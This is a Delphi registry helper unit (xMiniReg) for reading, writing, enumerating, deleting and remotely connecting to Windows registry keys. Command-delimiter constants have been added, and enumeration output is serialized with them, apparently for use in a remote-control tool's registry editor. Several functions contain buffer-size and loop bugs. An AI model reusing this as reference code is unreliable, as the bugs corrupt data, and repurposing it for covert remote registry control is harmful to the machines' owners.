unit xMiniReg;

{
  lightweight replacement for TRegistry. Does not use Classes or SysUtils. Intended
  for space-limited applets where only the commonly used functions are necessary.
  Returns True if Successful, else False.

  Written by Ben Hochstrasser (bhoc@surfeu.ch).
  This code is GPL.

  Function Examples:

  procedure TForm1.Button1Click(Sender: TObject);
  var
    ba1, ba2: array of byte;
    n: integer;
    s: String;
    d: Cardinal;
  begin
    setlength(ba1, 10);
    for n := 0 to 9 do ba1[n] := byte(n);

    RegSetString(HKEY_CURRENT_USER, 'Software\My Company\Test\foo\bar\TestString', 'TestMe');
    RegSetExpandString(HKEY_CURRENT_USER, 'Software\My Company\Test\foo\bar\TestExpandString', '%SystemRoot%\Test');
    RegSetMultiString(HKEY_CURRENT_USER, 'Software\My Company\Test\foo\bar\TestMultiString', 'String1'#0'String2'#0'String3');
    RegSetDword(HKEY_CURRENT_USER, 'Software\My Company\Test\foo\bar\TestDword', 7);
    RegSetBinary(HKEY_CURRENT_USER, 'Software\My Company\Test\foo\bar\TestBinary', ba1);

    To set the default value for a key, end the key name with a '\':
    RegSetString(HKEY_CURRENT_USER, 'Software\My Company\Test\', 'Default Value');
    RegGetString(HKEY_CURRENT_USER, 'Software\My Company\Test\foo\bar\TestString', s);
    RegGetMultiString(HKEY_CURRENT_USER, 'Software\My Company\Test\foo\bar\TestMultiString', s);
    RegGetExpandString(HKEY_CURRENT_USER, 'Software\My Company\Test\foo\bar\TestExpandString', s);
    RegGetAnyString(HKEY_CURRENT_USER, 'Software\My Company\Test\foo\bar\TestMultiString', s, StringType);
    RegSetAnyString(HKEY_CURRENT_USER, 'Software\My Company\Test\foo\bar\TestMultiString', s, StringType);
    RegGetDWORD(HKEY_CURRENT_USER, 'Software\My Company\Test\foo\bar\TestDword', d);
    RegGetBinary(HKEY_CURRENT_USER, 'Software\My Company\Test\foo\bar\TestBinary', s);
    SetLength(ba2, Length(s));
    for n := 1 to Length(s) do ba2[n-1] := byte(s[n]);
    Button1.Caption := IntToStr(Length(ba2));

    if RegKeyExists(HKEY_CURRENT_USER, 'Software\My Company\Test\foo') then
      if RegValueExists(HKEY_CURRENT_USER, 'Software\My Company\Test\foo\bar\TestBinary') then
        MessageBox(GetActiveWindow, 'OK', 'OK', MB_OK);
    RegDelValue(HKEY_CURRENT_USER, 'Software\My Company\Test\foo\bar\TestString');
    RegDelKey(HKEY_CURRENT_USER, 'Software\My Company\Test\foo\bar');
    RegDelKey(HKEY_CURRENT_USER, 'Software\My Company\Test\foo');
    RegDelKey(HKEY_CURRENT_USER, 'Software\My Company\Test');
    RegDelKey(HKEY_CURRENT_USER, 'Software\My Company');
    if RegEnumKeys(HKEY_CURRENT_USER, 'Software\My Company', s) then
      ListBox1.Text := s;
    if RegEnumValues(HKEY_CURRENT_USER, 'Software\My Company', s) then
      ListBox1.Text := s;
    if RegConnect('\\server1', HKEY_LOCAL_MACHINE, RemoteKey) then
    begin
      RegGetString(RemoteKey, 'Software\My Company\Test\foo\bar\TestString', s);
      RegDisconnect(RemoteKey);
    end;
  end;
}

interface

uses
  StrUtils,Windows;

const
  DelimitadorComandos = 'f74gfr4g3fhrefrebvier';
  DelimitadorComandosPassword = 'jfir8g54jgftr489evrt439';
  RegeditDelimitador = 'nfewvr3f9hr4fnrenen';

function RegSetString(RootKey: HKEY; Name: WideString; Value: WideString): boolean;
function RegSetMultiString(RootKey: HKEY; Name: WideString; Value: WideString): boolean;
function RegSetExpandString(RootKey: HKEY; Name: WideString; Value: WideString): boolean;
function RegSetDWORD(RootKey: HKEY; Name: WideString; Value: Cardinal): boolean;
function RegSetBinary(RootKey: HKEY; Name: WideString; Value: Array of Byte): boolean;
function RegGetString(RootKey: HKEY; Name: WideString; Var Value: WideString): boolean;
function RegGetMultiString(RootKey: HKEY; Name: WideString; Var Value: WideString): boolean;
function RegGetExpandString(RootKey: HKEY; Name: WideString; Var Value: WideString): boolean;
function RegGetAnyString(RootKey: HKEY; Name: WideString; Var Value: WideString; Var ValueType: Cardinal): boolean;
function RegSetAnyString(RootKey: HKEY; Name: WideString; Value: WideString; ValueType: Cardinal): boolean;
function RegGetDWORD(RootKey: HKEY; Name: WideString; Var Value: Cardinal): boolean;
function RegGetBinary(RootKey: HKEY; Name: WideString; Var Value: WideString): boolean;
function RegGetValueType(RootKey: HKEY; Name: WideString; var Value: Cardinal): boolean;
function RegValueExists(RootKey: HKEY; Name: WideString): boolean;
function RegKeyExists(RootKey: HKEY; Name: WideString): boolean;
function RegDelValue(RootKey: HKEY; Name: WideString): boolean;
function RegDelKey(RootKey: HKEY; Name: WideString): boolean;
function RegDelKeyEx(RootKey: HKEY; Name: WideString; WithSubKeys: Boolean = True): boolean;
function RegConnect(MachineName: WideString; RootKey: HKEY; var RemoteKey: HKEY): boolean;
function RegDisconnect(RemoteKey: HKEY): boolean;
function RegEnumKeys(RootKey: HKEY; Name: WideString; var KeyList: WideString): boolean;
function RegEnumValues(RootKey: HKEY; Name: WideString; var ValueList: WideString): boolean;
function _regCreateKey(hkKey: HKEY; lpSubKey: pWideChar): Boolean;
function _regDeleteKey(hkKey: HKEY; lpSubKey: pWideChar): Boolean;
function ReplaceChar(S: WideString; Old, New: WideChar): WideString;

implementation

uses
  //UnitConstantes,
  sysutils;

function _regDeleteKey(hkKey: HKEY; lpSubKey: pWideChar): Boolean;
begin
  Result := RegDeleteKeyW(hkKey, lpSubKey) = ERROR_SUCCESS;
end;


function _regCreateKey(hkKey: HKEY; lpSubKey: pWideChar): Boolean;
var
  phkResult: HKEY;
begin
  Result := RegCreateKeyW(hkKey, lpSubKey, phkResult) = ERROR_SUCCESS;
  RegCloseKey(phkResult);
end;

function LastPos(Needle: WideChar; Haystack: WideString): integer;
begin
  for Result := Length(Haystack) downto 1 do
    if Haystack[Result] = Needle then
      Break;
end;

function RegConnect(MachineName: WideString; RootKey: HKEY; var RemoteKey: HKEY): boolean;
begin
  Result := (RegConnectRegistryW(PWideChar(MachineName), RootKey, RemoteKey) = ERROR_SUCCESS);
end;

function RegDisconnect(RemoteKey: HKEY): boolean;
begin
  Result := (RegCloseKey(RemoteKey) = ERROR_SUCCESS);
end;

function RegSetValue(RootKey: HKEY; Name: WideString; ValType: Cardinal; PVal: Pointer; ValSize: Cardinal): boolean;
var
  SubKey: WideString;
  n: integer;
  dispo: DWORD;
  hTemp: HKEY;
begin
  Result := False;
  n := LastPos('\', Name);
  if n > 0 then
  begin
    SubKey := Copy(Name, 1, n - 1);
    if RegCreateKeyExW(RootKey, PWideChar(SubKey), 0, nil, REG_OPTION_NON_VOLATILE, KEY_WRITE, nil, hTemp, @dispo) = ERROR_SUCCESS then
    begin
      SubKey := Copy(Name, n + 1, Length(Name) - n);
      if SubKey = '' then
        Result := (RegSetValueExW(hTemp, nil, 0, ValType, PVal, ValSize) = ERROR_SUCCESS)
      else
        Result := (RegSetValueExW(hTemp, PWideChar(SubKey), 0, ValType, PVal, ValSize) = ERROR_SUCCESS);
      RegCloseKey(hTemp);
    end;
  end;
end;

function RegGetValue(RootKey: HKEY; Name: WideString; ValType: Cardinal; var PVal: Pointer; var ValSize: Cardinal): boolean;
var
  SubKey: WideString;
  n: integer;
  MyValType: DWORD;
  hTemp: HKEY;
  Buf: Pointer;
  BufSize: Cardinal;
  PKey: pWideChar;
begin
  Result := False;
  n := LastPos('\', Name);
  if n > 0 then
  begin
    SubKey := Copy(Name, 1, n - 1);
    if RegOpenKeyExW(RootKey, PWideChar(SubKey), 0, KEY_READ, hTemp) = ERROR_SUCCESS then
    begin
      SubKey := Copy(Name, n + 1, Length(Name) - n);
      if SubKey = '' then
        PKey := nil
      else
        PKey := PWideChar(SubKey);
      if RegQueryValueExW(hTemp, PKey, nil, @MyValType, nil, @BufSize) = ERROR_SUCCESS then
      begin
        GetMem(Buf, BufSize);
        if RegQueryValueExW(hTemp, PKey, nil, @MyValType, Buf, @BufSize) = ERROR_SUCCESS then
        begin
          if ValType = MyValType then
          begin
            PVal := Buf;
            ValSize := BufSize;
            Result := True;
          end else
          begin
            FreeMem(Buf);
          end;
        end else
        begin
          FreeMem(Buf);
        end;
      end;
      RegCloseKey(hTemp);
    end;
  end;
end;

function RegSetAnyString(RootKey: HKEY; Name: WideString; Value: WideString; ValueType: Cardinal): boolean;
begin
  case ValueType of
    REG_SZ, REG_EXPAND_SZ:
      Result := RegSetValue(RootKey, Name, ValueType, PWideChar(Value + #0), (Length(Value) * 2) + 2);
    Reg_MULTI_SZ:
      Result := RegSetValue(RootKey, Name, ValueType, PWideChar(Value + #0#0), (Length(Value) * 2) + 4);
  else
    Result := False;
  end;
end;

function RegSetString(RootKey: HKEY; Name: WideString; Value: WideString): boolean;
begin
  Result := RegSetValue(RootKey, Name, REG_SZ, PWideChar(Value + #0), (Length(Value) * 2) + 2);
end;

function RegSetMultiString(RootKey: HKEY; Name: WideString; Value: WideString): boolean;
begin
  Result := RegSetValue(RootKey, Name, REG_MULTI_SZ, PWideChar(Value + #0#0), (Length(Value) * 2) + 4);
end;

function RegSetExpandString(RootKey: HKEY; Name: WideString; Value: WideString): boolean;
begin
  Result := RegSetValue(RootKey, Name, REG_EXPAND_SZ, PWideChar(Value + #0), (Length(Value) * 2) + 2);
end;

function RegSetDword(RootKey: HKEY; Name: WideString; Value: Cardinal): boolean;
begin
  Result := RegSetValue(RootKey, Name, REG_DWORD, @Value, SizeOf(Cardinal));
end;

function RegSetBinary(RootKey: HKEY; Name: WideString; Value: Array of Byte): boolean;
begin
  Result := RegSetValue(RootKey, Name, REG_BINARY, @Value[Low(Value)], length(Value) * 2);
end;

function RegGetString(RootKey: HKEY; Name: WideString; Var Value: WideString): boolean;
var
  Buf: Pointer;
  BufSize: Cardinal;
begin
  Result := False;
  Value := '';
  if RegGetValue(RootKey, Name, REG_SZ, Buf, BufSize) then
  begin
    Dec(BufSize);
    SetLength(Value, (BufSize div 2) + 2);
    if BufSize > 0 then
      Move(Buf^, Value[1], BufSize);
    FreeMem(Buf);
    Result := True;
  end;
end;

function ReplaceChar(S: WideString; Old, New: WideChar): WideString;
var
  i, j: Integer;
begin
  for j := 0 to Length(S) do
  begin
    i := posex(Old, S);
    if i > 0 then
      S[i] := New;
  end;
  Result := S;
end;

function RegGetMultiString(RootKey: HKEY; Name: WideString; Var Value: WideString): boolean;
var
  Buf: Pointer;
  BufSize: Cardinal;
begin
  Result := False;
  Value := '';
  if RegGetValue(RootKey, Name, REG_MULTI_SZ, Buf, BufSize) then
  begin
    Dec(BufSize);
    SetLength(Value, (BufSize div 2) + 2);
    if BufSize > 0 then Move(Buf^, Value[1], BufSize);
    if BufSize > 0 then Value := ReplaceChar(Value, #0, #13);
    FreeMem(Buf);
    Result := True;
  end;
end;

function RegGetExpandString(RootKey: HKEY; Name: WideString; Var Value: WideString): boolean;
var
  Buf: Pointer;
  BufSize: Cardinal;
begin
  Result := False;
  Value := '';
  if RegGetValue(RootKey, Name, REG_EXPAND_SZ, Buf, BufSize) then
  begin
    Dec(BufSize);
    SetLength(Value, (BufSize div 2) + 2);
    if BufSize > 0 then
      Move(Buf^, Value[1], BufSize);
    FreeMem(Buf);
    Result := True;
  end;
end;

function RegGetAnyString(RootKey: HKEY; Name: WideString; Var Value: WideString; Var ValueType: Cardinal): boolean;
var
  Buf: Pointer;
  BufSize: Cardinal;
  bOK: Boolean;
  MultiString: boolean;
begin
  MultiString := False;
  Result := False;
  Value := '';
  if RegGetValueType(Rootkey, Name, ValueType) then
  begin
    case ValueType of
      REG_SZ, REG_EXPAND_SZ, REG_MULTI_SZ:
      begin
        if ValueType = REG_MULTI_SZ then MultiString := true;
        bOK := RegGetValue(RootKey, Name, ValueType, Buf, BufSize);
      end
    else
      bOK := False;
    end;
    if bOK then
    begin
      Dec(BufSize);
      SetLength(Value, (BufSize div 2) + 2);
      if BufSize > 0 then
        Move(Buf^, Value[1], BufSize);
      if MultiString then value := ReplaceChar(Value, #0, #13);

      FreeMem(Buf);
      Result := True;
    end;
  end;
end;

function RegGetDWORD(RootKey: HKEY; Name: WideString; Var Value: Cardinal): boolean;
var
  Buf: Pointer;
  BufSize: Cardinal;
begin
  Result := False;
  Value := 0;
  if RegGetValue(RootKey, Name, REG_DWORD, Buf, BufSize) then
  begin
    Value := PDWord(Buf)^;
    FreeMem(Buf);
    Result := True;
  end;
end;

function HexToInt(s: WideString): Longword;
var
  b: Byte;
  c: WideChar;
begin
  Result := 0;
  s := UpperCase(s);
  for b := 1 to Length(s) do
  begin
    Result := Result * 16;
    c := s[b];
    case c of
      '0'..'9': Inc(Result, Ord(c) - Ord('0'));
      'A'..'F': Inc(Result, Ord(c) - Ord('A') + 10);
      else
        raise EConvertError.Create('No Hex-Number');
    end;
  end;
end;

function RegGetBinary(RootKey: HKEY; Name: WideString; Var Value: WideString): boolean;
var
  Buf: Pointer;
  BufSize: Cardinal;
  Arr: Array of Byte;
  i: integer;
begin
  Result := False;
  Value := '';
  if RegGetValue(RootKey, Name, REG_BINARY, Buf, BufSize) then
  begin
    SetLength(Arr, BufSize);
    CopyMemory(Arr, Buf, BufSize);

    for i := 0 to BufSize do
      Value := Value + Char(HexToInt(IntToHex(Arr[i], 2)));

   	if BufSize > 0 then	Delete(Value, length(value), 1);

    FreeMem(Buf);
    Result := True;
  end;
end;

function RegValueExists(RootKey: HKEY; Name: WideString): boolean;
var
  SubKey: WideString;
  n: integer;
  hTemp: HKEY;
begin
  Result := False;
  n := LastPos('\', Name);
  if n > 0 then
  begin
    SubKey := Copy(Name, 1, n - 1);
    if RegOpenKeyExW(RootKey, PWideChar(SubKey), 0, KEY_READ, hTemp) = ERROR_SUCCESS then
    begin
      SubKey := Copy(Name, n + 1, Length(Name) - n);
      Result := (RegQueryValueExW(hTemp, PWideChar(SubKey), nil, nil, nil, nil) = ERROR_SUCCESS);
      RegCloseKey(hTemp);
    end;
  end;
end;

function RegGetValueType(RootKey: HKEY; Name: WideString; var Value: Cardinal): boolean;
var
  SubKey: WideString;
  n: integer;
  hTemp: HKEY;
  ValType: Cardinal;
begin
  Result := False;
  Value := REG_NONE;
  n := LastPos('\', Name);
  if n > 0 then
  begin
    SubKey := Copy(Name, 1, n - 1);
    if (RegOpenKeyExW(RootKey, PWideChar(SubKey), 0, KEY_READ, hTemp) = ERROR_SUCCESS) then
    begin
      SubKey := Copy(Name, n + 1, Length(Name) - n);
      if SubKey = '' then
        Result := (RegQueryValueExW(hTemp, nil, nil, @ValType, nil, nil) = ERROR_SUCCESS)
      else
        Result := (RegQueryValueExW(hTemp, PWideChar(SubKey), nil, @ValType, nil, nil) = ERROR_SUCCESS);
      if Result then
        Value := ValType;
      RegCloseKey(hTemp);
    end;
  end;
end;

function RegKeyExists(RootKey: HKEY; Name: WideString): boolean;
var
  hTemp: HKEY;
begin
  Result := False;
  if RegOpenKeyExW(RootKey, PWideChar(Name), 0, KEY_READ, hTemp) = ERROR_SUCCESS then
  begin
    Result := True;
    RegCloseKey(hTemp);
  end;
end;

function RegDelValue(RootKey: HKEY; Name: WideString): boolean;
var
  SubKey: WideString;
  n: integer;
  hTemp: HKEY;
begin
  Result := False;
  n := LastPos('\', Name);
  if n > 0 then
  begin
    SubKey := Copy(Name, 1, n - 1);
    if RegOpenKeyExW(RootKey, PWideChar(SubKey), 0, KEY_WRITE, hTemp) = ERROR_SUCCESS then
    begin
      SubKey := Copy(Name, n + 1, Length(Name) - n);
      Result := (RegDeleteValueW(hTemp, PWideChar(SubKey)) = ERROR_SUCCESS);
      RegCloseKey(hTemp);
    end;
  end;
end;

function RegDelKey(RootKey: HKEY; Name: WideString): boolean;
var
  SubKey: WideString;
  n: integer;
  hTemp: HKEY;
begin
  Result := False;
  n := LastPos('\', Name);
  if n > 0 then
  begin
    SubKey := Copy(Name, 1, n - 1);
    if RegOpenKeyExW(RootKey, PWideChar(SubKey), 0, KEY_WRITE, hTemp) = ERROR_SUCCESS then
    begin
      SubKey := Copy(Name, n + 1, Length(Name) - n);
      Result := (RegDeleteKeyW(hTemp, PWideChar(SubKey)) = ERROR_SUCCESS);
      RegCloseKey(hTemp);
    end;
  end;
end;

function RegDelKeyEx(RootKey: HKEY; Name: WideString; WithSubKeys: Boolean = True): boolean;
const
  MaxBufSize: Cardinal = 1024;
var
  iRes: integer;
  hTemp: HKEY;
  Buf: WideString;
  BufSize: Cardinal;
begin
  Result := False;
  // no root keys...
  if posex('\', Name) <> 0 then
  begin
    iRes := RegOpenKeyExW(RootKey, PWideChar(Name), 0, KEY_ENUMERATE_SUB_KEYS or KEY_WRITE, hTemp);
    if WithSubKeys then
    begin
      while iRes = ERROR_SUCCESS do
      begin
        BufSize := MaxBufSize;
        SetLength(Buf, BufSize);
        iRes := RegEnumKeyExW(hTemp, 0, @Buf[1], BufSize, nil, nil, nil, nil);
        if iRes = ERROR_NO_MORE_ITEMS then
        begin
          RegCloseKey(hTemp);
          Result := (RegDeleteKeyW(RootKey, PWideChar(Name)) = ERROR_SUCCESS);
        end else
        begin
          if iRes = ERROR_SUCCESS then
          begin
            SetLength(Buf, BufSize);
            if RegDelKeyEx(RootKey, Concat(Name, '\', Buf), WithSubKeys) then
              iRes := ERROR_SUCCESS
            else
              iRES := ERROR_BADKEY;
          end;
        end;
      end;
    end else
    begin
      RegCloseKey(hTemp);
      Result := (RegDeleteKeyW(RootKey, PWideChar(Name)) = ERROR_SUCCESS);
    end;
  end;
end;

function IntToStr(I: integer): WideString;
begin
  Str(I, Result);
end;

function MyRegReadString(Key: HKey; SubKey: WideString; DataType: integer; Data: WideString): WideString;
var
  RegKey: HKey;
  Buffer: array[0..9999] of WideChar;
  BufSize: Integer;
begin
  BufSize := SizeOf(Buffer);
  Result := '';
  if RegOpenKeyW(Key,pWidechar(SubKey),RegKey) = ERROR_SUCCESS then begin;
    if RegQueryValueExW(RegKey, pWidechar(Data), nil,  @DataType, @Buffer, @BufSize) = ERROR_SUCCESS then begin;
      RegCloseKey(RegKey);
      Result := widestring(Buffer);
    end;
  end;
end;


function RegEnum(RootKey: HKEY; Name: WideString; var ResultList: WideString; const DoKeys: Boolean): boolean;
var
  i: integer;
  iRes: integer;
  s: WideString;
  hTemp: HKEY;
  Buf: Pointer;
  BufSize: Cardinal;
  regtype: dword;
  regdata: WideString;
  regdworddata: dword;
  valset: bool;
begin
  Result := False;
  ResultList := '';
  if RegOpenKeyExW(RootKey, PWideChar(Name), 0, KEY_READ, hTemp) = ERROR_SUCCESS then
  begin
    Result := True;
    BufSize := 1024;

    GetMem(buf, BufSize);

    i := 0;
    iRes := ERROR_SUCCESS;

    while iRes = ERROR_SUCCESS do
    begin
      BufSize := 1024;
      if DoKeys then iRes := RegEnumKeyExW(hTemp, i, buf, BufSize, nil, nil, nil, nil)
      else iRes := RegEnumValueW(hTemp, i, buf, BufSize, nil, nil, nil, nil);

      if iRes = ERROR_SUCCESS then
      begin
        SetLength(s, BufSize);
        Move(buf^, s[1], BufSize * 2);
        ZeroMemory(buf, BufSize);

        reggetvaluetype(RootKey, Name + s, regtype);

        valset := false;

        if regtype = REG_DWORD then
        begin
          RegGetDword(RootKey, Name + s, RegDwordData);
          s := s + delimitadorComandos + inttostr(regtype) + delimitadorComandos + inttostr(RegDwordData) + delimitadorComandos + RegeditDelimitador;
          valset := true;
        end;

        if regtype = REG_BINARY then
        begin
          RegGetBinary(RootKey,Name + s,regdata);
          s := s + delimitadorComandos + inttostr(regtype) + delimitadorComandos + regdata + delimitadorComandos + RegeditDelimitador;
          valset := true;
        end;

        if not valset then
        begin
          reggetanystring(RootKey,Name + s,regdata,regtype);
          s := s + delimitadorComandos + inttostr(regtype) + delimitadorComandos + regdata + delimitadorComandos + RegeditDelimitador;
        end;

        ResultList := ResultList + s;
        inc(i);
      end;

    end;
    RegCloseKey(hTemp);
  end;
end;

function RegEnumValues(RootKey: HKEY; Name: WideString; var ValueList: WideString): boolean;
begin
  Result := RegEnum(RootKey, Name, ValueList, False);
end;

function RegEnumKeys(RootKey: HKEY; Name: WideString; var KeyList: WideString): boolean;
begin
  Result := RegEnum(RootKey, Name, KeyList, True);
end;

end.
